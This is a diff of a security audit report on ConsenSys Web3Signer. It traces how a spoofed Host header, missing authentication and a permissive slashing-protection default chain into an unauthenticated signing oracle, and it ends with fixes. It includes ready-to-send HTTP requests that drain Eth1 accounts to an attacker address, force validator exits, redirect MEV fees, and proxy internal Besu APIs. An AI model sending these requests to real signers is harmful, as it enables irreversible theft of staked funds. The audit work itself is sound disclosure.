@@ -1,378 +1,255 @@
-# Web3Signer Security Audit — Chained Exploit Analysis
+# Web3Signer: Signing Oracle via Three Chained Gaps — Total Asset Compromise
 
-**Date:** 2026-02-09
-**Target:** ConsenSys Web3Signer (current HEAD: `d8ea31d`)
-**Objective:** Demonstrate a concrete, end-to-end attack chain through which a completely unprivileged network actor causes irreversible financial damage to validator assets on the Ethereum beacon chain.
+**Target:** ConsenSys Web3Signer (HEAD `d8ea31d`)
 
 ---
 
-## The Attack: Forced Mass Validator Exit + MEV Fee Hijack
+## What This Is
 
-An attacker with nothing more than TCP connectivity to the Web3Signer port executes two parallel operations:
+Three gaps in the codebase chain together to give any network-reachable attacker an **unrestricted signing oracle** — functionally identical to stealing every private key the signer holds. The attacker can sign anything, with any key, unlimited times, with no credential.
 
-- **Phase A** — Sign `VALIDATOR_REGISTRATION` messages pointing `fee_recipient` to the attacker's address. This silently redirects all MEV rewards and priority fees. The validators keep running normally; the operator sees no errors; money flows to the attacker.
-
-- **Phase B** — Sign `VOLUNTARY_EXIT` messages for every loaded validator. Once broadcast to the beacon chain, each validator is **permanently, irreversibly** removed from the active set. Staked ETH is locked in the exit queue. There is no "undo" operation on the Ethereum protocol.
-
-Both phases use the same chain of code-level gaps. Neither requires credentials, tokens, certificates, or any form of authentication.
+This is not about one endpoint or one missing check. It's about how three individually-incomplete weaknesses combine to give the attacker the **signing function itself**, and what that function controls.
 
 ---
 
-## Step-by-Step Code Trace
+## The Three Gaps
 
-### Step 0: Precondition — The Port is Reachable
+### Gap 1: Host Header Is the Only Gate, and It's Client-Controlled
 
-Web3Signer listens on `--http-listen-port` (default `9000`). The default bind address is `localhost` (`Web3SignerBaseCommand.java:128`), but containerized and cloud deployments routinely override this to `0.0.0.0`:
-
-```yaml
-# docker-compose, Kubernetes, or CLI:
---http-listen-host=0.0.0.0
-```
-
-Once bound to a non-loopback interface, the single remaining access control is the Host header allowlist. That is the next link in the chain.
-
----
-
-### Step 1: Bypass HostAllowListHandler — `Host: localhost`
-
-**File:** `core/.../HostAllowListHandler.java:34-48`
-
-```java
-public void handle(final RoutingContext event) {
-    final Optional<String> hostHeader = getAndValidateHostHeader(event);     // ← reads Host header
-    if (httpHostAllowList.contains("*")
-        || (hostHeader.isPresent() && hostIsInAllowlist(hostHeader.get()))) {
-      event.next();                                                          // ← passes through
-    } else {
-      response.setStatusCode(403)...
-    }
-}
-```
-
-**File:** `core/.../HostAllowListHandler.java:50-52`
-
+`HostAllowListHandler.java:50-52`:
 ```java
 private Optional<String> getAndValidateHostHeader(final RoutingContext event) {
-    final HostAndPort hostAndPort = event.request().authority();  // ← parses HTTP "Host:" header
+    final HostAndPort hostAndPort = event.request().authority();   // reads HTTP "Host:" header
     return Optional.ofNullable(hostAndPort).map(HostAndPort::host);
 }
 ```
 
-**What happens:** `event.request().authority()` returns the value of the HTTP `Host` header — a value the *client* controls entirely. It does **not** inspect the TCP source IP. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`).
+This reads `event.request().authority()` — the HTTP `Host` header — which is a value the **client** sets. It never calls `event.request().remoteAddress()`. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`). Any client from any IP sets `Host: localhost` and passes.
 
-**Attacker action:** Set `Host: localhost` in the HTTP request. The comparison `allowlistEntry.equalsIgnoreCase(hostHeader)` at line 57 matches. `event.next()` is called. The request proceeds as if it came from localhost.
+### Gap 2: Nothing After the Gate
+
+`Runner.java:128-155` — the Vert.x router chain is:
 
 ```
-attacker (any IP) → TCP connect to <TARGET>:9000
-                   → HTTP header "Host: localhost"
-                   → HostAllowListHandler passes the request
+AccessLog -> CorsHandler -> HostAllowListHandler -> BodyHandler -> [route handlers]
 ```
 
-There is no second layer of defense. No authentication middleware exists in the router chain. See `Runner.java:128-155`: after CorsHandler and HostAllowListHandler, the next handlers are BodyHandler and the route handlers themselves.
+No `AuthHandler`. No `BearerAuthHandler`. No JWT validation. No API key check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` — **no code implements it**. After the Host header passes, every request reaches the handler with full trust.
 
----
+### Gap 3: Slashing Protection Is Scoped Wrong
 
-### Step 2: Enumerate All Validator Public Keys
-
-**Route:** `GET /api/v1/eth2/publicKeys`
-**File:** `core/.../routes/PublicKeysListRoute.java:42-49`
-
+`Eth2SignForIdentifierHandler.java:169-200`:
 ```java
-context.getRouter()
-    .route(HttpMethod.GET, path)                                // path = "/api/v1/eth2/publicKeys"
-    .produces(JSON_HEADER)
-    .handler(new BlockingHandlerDecorator(
-        new PublicKeysListHandler(context.getArtifactSignerProviders()), false))
-    .failureHandler(context.getErrorHandler());
-    // NO AUTH
-```
-
-**What happens:** `PublicKeysListHandler` calls `artifactSignerProvider.availableIdentifiers()` and returns every loaded BLS public key as a JSON array.
-
-**Attacker receives:**
-```json
-["0x8a5d3e6f...pubkey1...", "0xb12c4a7e...pubkey2...", ... ]
-```
-
-The attacker now knows every validator identity managed by this Web3Signer instance. This is the target list for both phases.
-
----
-
-### Step 3: Obtain Public Beacon Chain Parameters
-
-The signing request requires `fork_info` (for VOLUNTARY_EXIT) — this is **entirely public** data:
-
-```bash
-# From any beacon node (attacker's own, or any public one):
-curl https://beacon-node/eth/v1/beacon/states/head/fork
-# → {"previous_version":"0x04000000","current_version":"0x05000000","epoch":"269568"}
-
-curl https://beacon-node/eth/v1/beacon/genesis
-# → {"genesis_validators_root":"0x4b363db94e286120d76eb905340fcd44b1..."}
-```
-
-The validator_index for each public key is also public:
-```bash
-curl https://beacon-node/eth/v1/beacon/states/head/validators?id=0x8a5d3e6f...
-# → {"index":"12345", ...}
-```
-
-No secrets are needed. Every input to the signing request is either public blockchain data or controlled by the attacker.
-
----
-
-### Step 4A: Phase A — Hijack MEV Fee Recipient (VALIDATOR_REGISTRATION)
-
-**Route:** `POST /api/v1/eth2/sign/:identifier`
-**File:** `core/.../routes/eth2/Eth2SignRoute.java:36,73`
-
-```java
-private static final String SIGN_PATH = "/api/v1/eth2/sign/:identifier";
-// ...
-context.getRouter().route(HttpMethod.POST, SIGN_PATH)
-    .handler(new BlockingHandlerDecorator(
-        new Eth2SignForIdentifierHandler(...), false))  // NO AUTH
-```
-
-**Attacker sends (for each validator public key):**
-
-```http
-POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
-Host: localhost
-Content-Type: application/json
-
-{
-  "type": "VALIDATOR_REGISTRATION",
-  "validator_registration": {
-    "fee_recipient": "0xATTACKER_ETH_ADDRESS_HERE_20BYTES",
-    "gas_limit": "30000000",
-    "timestamp": "1707436800",
-    "pubkey": "0x8a5d3e6f...same_pubkey..."
-  }
+private boolean maySign(...) {
+    switch (eth2SigningRequestBody.type()) {
+      case BLOCK, BLOCK_V2 -> { /* DB check */ }
+      case ATTESTATION     -> { /* DB check */ }
+      default -> { return true; }          // 10 of 13 types pass unconditionally
+    }
 }
 ```
 
-**Code flow:**
-
-1. **`Eth2SignForIdentifierHandler.handle()`** — line 88
-
-2. **Parse body** — line 94: `getSigningRequest()` deserializes to `Eth2SigningRequestBody` record. Field `type` = `VALIDATOR_REGISTRATION`.
-
-3. **Compute signing root** — line 100: `computeSigningRoot()` enters:
-   ```java
-   // line 316-320
-   case VALIDATOR_REGISTRATION -> {
-       checkArgument(validatorRegistration != null, "ValidatorRegistration is required");
-       return signingRootUtil.signingRootForValidatorRegistration(
-           validatorRegistration.asInternalValidatorRegistration());
-   }
-   ```
-   Note: **no `fork_info` needed** for this type. The signing root is computed solely from the validator registration data, including the attacker's `fee_recipient`.
-
-4. **Sign** — line 133-134: `signerForIdentifier.sign(normalisedIdentifier, signingRoot)`:
-   ```java
-   // SignerForIdentifier.java:42
-   return signerProvider.getSigner(identifier).map(signer -> signer.sign(data).asHex());
-   ```
-   The **BLS private key** produces a signature over the attacker's registration data. The signature is computed and held in memory.
-
-5. **Slashing protection check** — line 150: `maySign()` is called:
-   ```java
-   // line 169-200
-   private boolean maySign(...) {
-       switch (eth2SigningRequestBody.type()) {
-         case BLOCK, BLOCK_V2 -> { /* check */ }
-         case ATTESTATION -> { /* check */ }
-         default -> {
-           return true;    // ← VALIDATOR_REGISTRATION lands here. UNCONDITIONAL PASS.
-         }
-       }
-   }
-   ```
-   **`return true`** — no check performed for VALIDATOR_REGISTRATION.
-
-6. **Return signature** — line 152: `respondWithSignature()` sends the BLS signature back to the attacker.
-
-**Attacker receives:**
-```json
-{"signature":"0xa1b2c3d4e5f6...valid_BLS_signature..."}
-```
-
-**Blockchain-side effect:**
-
-The attacker submits this signed `ValidatorRegistration` to MEV relay(s):
-```bash
-POST https://relay.example.com/relay/v1/builder/validators
-[{"message":{"fee_recipient":"0xATTACKER...","gas_limit":"30000000",
-  "timestamp":"1707436800","pubkey":"0x8a5d3e6f..."},
-  "signature":"0xa1b2c3d4..."}]
-```
-
-The relay verifies the BLS signature against the validator's known public key. It's valid. From this point forward, any block built by this relay for this validator sends priority fees and MEV to `0xATTACKER`. The validator operator sees no immediate error — the validator keeps attesting and proposing — but **all execution-layer revenue is stolen**.
+Slashing protection guards against protocol-level slashing (double blocks, surround votes). It treats everything else as "safe to sign." But `VOLUNTARY_EXIT` is irreversible. `VALIDATOR_REGISTRATION` controls where money goes. `DEPOSIT` controls withdrawal credentials. None of these are "slashable," but all are destructive. The design conflates "not slashable" with "safe."
 
 ---
 
-### Step 4B: Phase B — Force Permanent Validator Exit (VOLUNTARY_EXIT)
+## What the Signing Oracle Means — Concretely
 
-**Attacker sends (for each validator public key):**
+Gaps 1+2+3 give the attacker a function: **sign(key, data) -> signature**, for any key loaded in Web3Signer, with any data, unlimited times.
 
+This is not theoretical. Here is what that function controls in each deployment mode:
+
+---
+
+### Eth1 Mode: Immediate, Complete Fund Theft
+
+In Eth1 mode, Web3Signer acts as a signing proxy in front of a Besu node. It handles `eth_sendTransaction` — which **signs AND broadcasts** the transaction to the network in a single call.
+
+**Code path:**
+
+```
+JsonRpcRoute.java:94-100
+  -> route(POST, "/")
+  -> JsonRpcHandler
+      -> RequestMapper.java dispatch
+          -> "eth_sendTransaction" -> SendTransactionHandler.java:58
+
+SendTransactionHandler.java:58-86
+  :62 -> transactionFactory.createTransaction(context, request)
+          -> Transaction object: from=VICTIM, to=ATTACKER, value=ALL_ETH
+  :78 -> secpSigner.isSignerAvailable(victim_address) -> true (key is loaded)
+  :85 -> sendTransaction(transaction, context, secpSigner, request)
+
+  -> TransactionSerializer.java:43-51
+      :98-102 -> secpSigner.sign(victim_address, bytesToSign) -> Secp256k1 signature
+                 (SignerForIdentifier.java:42 -> real private key signs)
+
+  -> TransactionTransmitter.java:58-71
+      :59 -> createSignedTransactionPayload() -> RLP-encoded signed transaction
+      :66 -> sendTransaction(Json.encode(request))
+
+  -> TransactionTransmitter.java:112-117
+      :116 -> transmitter.sendRequest(method, headers, path, bodyContent)
+               -> VertxRequestTransmitter forwards to downstream Besu node
+               -> Besu broadcasts to Ethereum network
+               -> Transaction is mined
+               -> Funds are transferred
+```
+
+**Attacker sends:**
 ```http
-POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
+POST / HTTP/1.1
 Host: localhost
 Content-Type: application/json
 
-{
-  "type": "VOLUNTARY_EXIT",
-  "fork_info": {
-    "fork": {
-      "previous_version": "0x04000000",
-      "current_version": "0x05000000",
-      "epoch": "269568"
-    },
-    "genesis_validators_root": "0x4b363db94e286120d76eb905340fcd44b1..."
-  },
-  "voluntary_exit": {
-    "epoch": "269568",
-    "validator_index": "12345"
-  }
-}
+{"jsonrpc":"2.0","method":"eth_sendTransaction",
+ "params":[{"from":"0xVICTIM_ADDRESS","to":"0xATTACKER_ADDRESS",
+            "value":"0xDE0B6B3A7640000"}],"id":1}
 ```
 
-**Code flow (same handler, same path):**
+**What happens on-chain:** The signed transaction is broadcast. The ETH moves from victim to attacker. It is mined into a block. The transfer is final.
 
-1. **Parse body** — type = `VOLUNTARY_EXIT`
+The attacker doesn't even need to know the victim's balance first — they call `eth_accounts` (also unauthenticated, `JsonRpcRoute.java:131-135`) to enumerate all loaded addresses, then drain each one. Web3Signer helpfully auto-fills the nonce via `RetryingTransactionTransmitter` (line 110-115) which retries with incremented nonces up to 10 times if nonce is too low.
 
-2. **Compute signing root** — line 271-274:
-   ```java
-   case VOLUNTARY_EXIT -> {
-       checkArgument(body.voluntaryExit() != null, "voluntaryExit must be specified");
-       return signingRootUtil.signingRootForSignVoluntaryExit(
-           body.voluntaryExit().asInternalVoluntaryExit(),   // epoch + validator_index
-           body.forkInfo().asInternalForkInfo());             // public fork data
-   }
-   ```
-   The signing root is a function of `(epoch, validator_index, fork, genesis_validators_root)` — all public values.
+**Additionally** — `PassThroughHandler` (`JsonRpcRoute.java:103-107`) forwards **every unrecognized JSON-RPC method** to the internal Besu node:
 
-3. **Sign** — line 133-134: BLS signature computed with the validator's private key. The signature now exists.
-
-4. **Slashing protection** — line 196-197: `default -> return true`. **No check**. The signature is returned to the attacker.
-
-5. **Return signature** — attacker receives the valid BLS signature.
-
-**Blockchain-side effect:**
-
-The attacker constructs a `SignedVoluntaryExit` and broadcasts to any beacon node:
-
-```bash
-POST https://beacon-node/eth/v1/beacon/pool/voluntary_exits
-{"message":{"epoch":"269568","validator_index":"12345"},
- "signature":"0xreturnedSignature..."}
+```java
+// JsonRpcRoute.java:103-107
+context.getRouter().route()
+    .handler(BodyHandler.create())
+    .handler(new PassThroughHandler(transmitterFactory, JSON_DECODER));
 ```
 
-The beacon chain:
-1. Verifies the BLS signature against the validator's on-chain public key → **valid**
-2. Checks the epoch is current or past → **valid** (attacker used current epoch)
-3. Adds the validator to the exit queue
-4. After `MIN_VALIDATOR_WITHDRAWABILITY_DELAY` (256 epochs ≈ 27 hours), the validator is **permanently exited**
+```java
+// PassThroughHandler.java:56-62
+final VertxRequestTransmitter transmitter =
+    transmitterFactory.create(new ForwardedMessageResponder(context));
+transmitter.sendRequest(request.method(), headersToSend, request.path(),
+    context.body().asString());   // forwards ANYTHING to Besu
+```
 
-**This is irreversible.** There is no on-chain mechanism to cancel a voluntary exit once it's been included. The validator can never re-enter the active set. The staked ETH (32 ETH per validator) is locked until the withdrawal epoch.
+This gives the attacker an open SSRF proxy to the internal Besu node — `admin_peers`, `debug_traceTransaction`, `txpool_content`, `miner_setEtherbase` — whatever the downstream node exposes. APIs that are never meant to be externally reachable become externally reachable through Web3Signer.
+
+**Eth1 bottom line:** The attacker drains every account, immediately, irreversibly. Plus full proxy access to the internal Besu node.
 
 ---
 
-## Why the Chain Works — The Three Gaps That Must All Exist
+### Eth2 Mode: Permanent Validator Destruction + Revenue Theft
 
-The attack requires three code-level gaps to co-exist. Remove any one and the chain breaks:
-
-### Gap 1: Authentication Void
-
-`Runner.java:128-155` — the router chain is: AccessLog → CorsHandler → **HostAllowListHandler** → BodyHandler → route handlers.
-
-There is no `AuthHandler`, no `BearerAuthHandler`, no `JWTAuthHandler`, no `BasicAuthHandler`. The only gate is the Host header check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` but **no code implements it**. Search for `bearerAuth`, `JWT`, `Authorization` header parsing in any handler — it doesn't exist.
-
-### Gap 2: Host Header as Access Control
-
-`HostAllowListHandler.java:50-52` — `event.request().authority()` returns the client-supplied `Host` header. It does not call `event.request().remoteAddress()` to validate the actual source IP. This makes the allowlist a client-side control — effectively an honor system.
-
-### Gap 3: Slashing Protection Doesn't Protect What Matters Most
-
-`Eth2SignForIdentifierHandler.java:196-197` — the `default -> return true` branch means slashing protection is a filter for only 3 of 13 artifact types: `BLOCK`, `BLOCK_V2`, `ATTESTATION`. The remaining 10 types — including the two most destructive ones (`VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`) — pass unconditionally.
-
-The design assumption was that slashing protection only needs to prevent *protocol slashing conditions* (double blocks, surround votes). But the signing endpoint handles far more than slashable messages. `VOLUNTARY_EXIT` is not a slashable offense — it's a valid protocol operation — but it's *irreversible and destructive*. The implicit `return true` treats "not slashable" as "safe to sign," which is a category error.
-
----
-
-## Financial Impact Model
-
-For a staking operator running N validators through a single Web3Signer instance:
-
-| Impact | Scope | Recovery |
-|--------|-------|----------|
-| MEV fee theft (Phase A) | All N validators × ongoing | Operator must re-register with correct fee_recipient after detecting theft. Revenue lost during theft window is unrecoverable. |
-| Forced exit (Phase B) | All N validators × 32 ETH | **Irreversible.** ETH is locked until withdrawal. Operator must create new validators with new deposits. During exit queue + withdrawal delay, the capital is completely illiquid. |
-| Attestation reward loss | All N validators | From the moment of exit, all future attestation/proposal rewards are permanently forfeited. |
-
-For a mid-size operator (1000 validators): 32,000 ETH ($80M+ at current prices) of staked capital locked and made illiquid, plus ongoing revenue stream destroyed.
-
----
-
-## Exact Code Path Map
+#### Attack A: Force-Exit Every Validator (Irreversible On-Chain)
 
 ```
-HTTP Request
-│
-├─ Runner.java:143 ──── registerHttpHostAllowListHandler(router)
-│   └─ HostAllowListHandler.java:36-37 ──── Host header == "localhost"? → PASS
-│
-├─ Runner.java:149 ──── BodyHandler (parses JSON body)
-│
-├─ Eth2SignRoute.java:73 ──── route(POST, "/api/v1/eth2/sign/:identifier")
-│   └─ Eth2SignForIdentifierHandler.java:88 ──── handle()
-│       │
-│       ├─ :94 ──── getSigningRequest() → Eth2SigningRequestBody
-│       │   type = VOLUNTARY_EXIT  (or VALIDATOR_REGISTRATION)
-│       │
-│       ├─ :100 ──── computeSigningRoot()
-│       │   └─ :271-274 (VOLUNTARY_EXIT) → signingRootUtil.signingRootForSignVoluntaryExit()
-│       │   └─ :316-320 (VALIDATOR_REGISTRATION) → signingRootUtil.signingRootForValidatorRegistration()
-│       │
-│       ├─ :110 ──── slashingProtection.isPresent()? YES
-│       │   └─ :111-117 ──── handleSigning(context, signingRoot, id, signatureConsumer)
-│       │       │
-│       │       └─ :133-134 ──── signerForIdentifier.sign(id, signingRoot) ◄── BLS SIGNATURE COMPUTED
-│       │           │                                                         using real private key
-│       │           └─ SignerForIdentifier.java:42
-│       │               └─ signerProvider.getSigner(id) → BlsArtifactSigner
-│       │                   └─ signer.sign(data) → BLSSignature
-│       │
-│       │   signatureConsumer is called with the computed signature:
-│       │
-│       │       └─ :143-161 ──── signWithSlashingProtection()
-│       │           │
-│       │           └─ :150 ──── maySign(pubkey, signingRoot, body)
-│       │               │
-│       │               └─ :174 ──── switch(type)
-│       │                   ├─ BLOCK/BLOCK_V2 → slashing check  (not our type)
-│       │                   ├─ ATTESTATION    → slashing check  (not our type)
-│       │                   └─ default        → return true     ◄── BYPASS: NO CHECK
-│       │
-│       │           :151-152 ──── slashingMetrics.incrementSigningsPermitted()
-│       │                         respondWithSignature(context, signature)
-│       │
-│       └─ HTTP 200: {"signature": "0x..."} ◄── VALID BLS SIGNATURE RETURNED TO ATTACKER
-│
-└── Attacker broadcasts to beacon chain → validator permanently exited
+POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
+Host: localhost
+
+{"type":"VOLUNTARY_EXIT",
+ "fork_info":{"fork":{"previous_version":"0x04000000",
+   "current_version":"0x05000000","epoch":"269568"},
+   "genesis_validators_root":"0x4b363db94e..."},
+ "voluntary_exit":{"epoch":"269568","validator_index":"12345"}}
+```
+
+All inputs are public blockchain data. Code path through `Eth2SignForIdentifierHandler.java`:
+- `:94` — parse body, type = `VOLUNTARY_EXIT`
+- `:100` -> `computeSigningRoot()` -> `:271-274` — compute root from epoch + validator_index + fork
+- `:133-134` — `signerForIdentifier.sign()` — **BLS signature produced with real private key**
+- `:150` -> `maySign()` -> `:196-197` — `default -> return true` — **no check**
+- `:152` — `respondWithSignature()` — **signature returned to attacker**
+
+Attacker broadcasts `SignedVoluntaryExit` to any beacon node. The beacon chain verifies the BLS signature (valid — signed by the real key). The validator enters the exit queue. After 256 epochs (~27 hours), it is **permanently removed from the active set**. There is no on-chain mechanism to cancel a voluntary exit. Ever. The staked 32 ETH is locked until the withdrawal epoch.
+
+For N validators: N x 32 ETH of staked capital becomes illiquid. All future consensus rewards are permanently forfeited. The operator must re-deposit with entirely new keys and wait through the activation queue (weeks to months).
+
+#### Attack B: Redirect All Revenue (Stealth, Ongoing)
+
+```
+POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
+Host: localhost
+
+{"type":"VALIDATOR_REGISTRATION",
+ "validator_registration":{"fee_recipient":"0xATTACKER_ADDRESS",
+   "gas_limit":"30000000","timestamp":"1707436800",
+   "pubkey":"0x<SAME_PUBKEY>"}}
+```
+
+Same code path. `VALIDATOR_REGISTRATION` -> `computeSigningRoot()` at `:316-320` (doesn't even need fork_info). Signs. `maySign()` -> `default -> return true`. Signature returned.
+
+Attacker submits signed registration to MEV relays. Relays verify signature against on-chain pubkey (valid). All future blocks built by relays for this validator send priority fees + MEV to `0xATTACKER`. The operator sees nothing wrong — the validator keeps attesting and proposing normally. Money silently flows to the attacker until someone manually audits fee recipient registrations across all relays.
+
+#### Attack C: Deny Consensus Participation (Ongoing Penalties)
+
+The attacker can **race** the legitimate beacon node's signing requests. If the attacker signs a block at slot X before the beacon node does, slashing protection records the attacker's version. When the legitimate beacon node requests a signature for its block at slot X, `maySignBlock()` returns false (slot already signed). The validator misses its proposal. Repeat for attestations (sign a valid attestation at each epoch before the beacon node does). The validator incurs inactivity penalties and loses ETH through missed duties, even without being exited.
+
+---
+
+## Combined Impact — This Is Total Compromise
+
+The signing oracle is **functionally identical to possessing all private keys**. The distinction between "signing access" and "key theft" doesn't matter when:
+
+- There is no rate limit (sign unlimited times)
+- There is no type restriction (sign anything — transactions, exits, registrations, blocks, deposits)
+- There is no revocation mechanism (the oracle works as long as the process runs)
+- There is no audit alerting (signing operations log at TRACE/DEBUG only)
+
+| Mode | What Happens | Is It Reversible? |
+|------|-------------|-------------------|
+| **Eth1** | Every ETH balance drained from every loaded Secp256k1 account via `eth_sendTransaction` | **No.** Transactions are final once mined. |
+| **Eth1** | Full SSRF proxy to internal Besu node (admin/debug/txpool APIs) | Depends on downstream exposure. |
+| **Eth2** | Every validator permanently force-exited via `VOLUNTARY_EXIT` | **No.** Exits are irreversible on-chain. |
+| **Eth2** | All MEV + priority fee revenue redirected via `VALIDATOR_REGISTRATION` | Revenue lost during theft window is gone. |
+| **Eth2** | Legitimate proposals/attestations blocked by racing, causing inactivity leak | Stops when attacker stops, but penalties already incurred. |
+
+For a staking operation with 1,000 validators and associated Eth1 accounts: every account is drained, every validator is permanently exited, and all MEV revenue is redirected — simultaneously, in minutes, with no credentials.
+
+---
+
+## Exact Code Path (Eth1 — Direct Fund Theft)
+
+```
+HTTP POST / {"jsonrpc":"2.0","method":"eth_sendTransaction","params":[...]}
+|
++- Runner.java:143 -- HostAllowListHandler
+|   +- :36-37 -- Host="localhost" -> allowlist match -> event.next()
+|       (NO remoteAddress check. NO auth layer follows.)
+|
++- JsonRpcRoute.java:94-100 -- route(POST, "/")
+|   +- JsonRpcHandler -> RequestMapper -> "eth_sendTransaction"
+|       +- SendTransactionHandler.java:58 -- handle()
+|           |
+|           +- :62 -- transactionFactory.createTransaction()
+|           |         from = 0xVICTIM, to = 0xATTACKER, value = all ETH
+|           |
+|           +- :78 -- secpSigner.isSignerAvailable(victim) -> true
+|           |
+|           +- :85 -- sendTransaction()
+|               |
+|               +- TransactionSerializer.java:98-102
+|               |   +- secpSigner.sign(victim_address, txBytes)
+|               |       +- SignerForIdentifier.java:42
+|               |           +- signerProvider.getSigner(victim)
+|               |               +- EthSecpArtifactSigner.sign(data) <<< REAL PRIVATE KEY SIGNS
+|               |
+|               +- TransactionTransmitter.java:112-117
+|                   +- transmitter.sendRequest(POST, headers, "/", signedTxJson)
+|                       +- VertxRequestTransmitter.java:70-79
+|                           +- downStreamConnection.request(POST, "/")
+|                               +- request.end(signedTxBody)
+|                                   +- Besu receives eth_sendRawTransaction
+|                                       +- Transaction broadcast to Ethereum p2p network
+|                                           +- Mined into block
+|                                               +- ETH transferred to attacker <<< DONE
 ```
 
 ---
 
-## What Must Change to Break the Chain
+## What Breaks the Chain
 
-Any one of these mitigations breaks the chain completely:
+Any one of these kills it:
 
-1. **Require authentication** — Add bearer token / mTLS validation to the router before any handler. If the attacker can't authenticate, nothing past the router matters.
+1. **Authentication** — Bearer token, mTLS, or API key validation in the router chain before any handler. Cost: one middleware addition in `Runner.java`. The attacker is stopped before reaching any route. This is the minimal fix and it kills the chain for both Eth1 and Eth2 modes.
 
-2. **Validate source IP, not Host header** — Replace `event.request().authority()` with `event.request().remoteAddress()` in HostAllowListHandler. A spoofed Host header no longer bypasses the check.
+2. **Source IP validation** — Replace `event.request().authority()` with `event.request().remoteAddress()` in `HostAllowListHandler`. The attacker can no longer bypass the allowlist by spoofing a header.
 
-3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false` (or at minimum add explicit cases for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION` with meaningful protection logic, such as operator confirmation or rate limiting).
+3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false`. At minimum, add explicit deny for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`. This only helps Eth2 mode; Eth1 has no equivalent concept — there is nothing between the signing function and fund transfer.
 
-Any single one of these stops the attack. Currently, all three gaps co-exist, and the chain from "TCP connection" to "irreversible on-chain damage" is unbroken.
+The minimal fix is #1. Currently all three gaps co-exist, and the path from TCP connect to total asset drainage is unbroken.
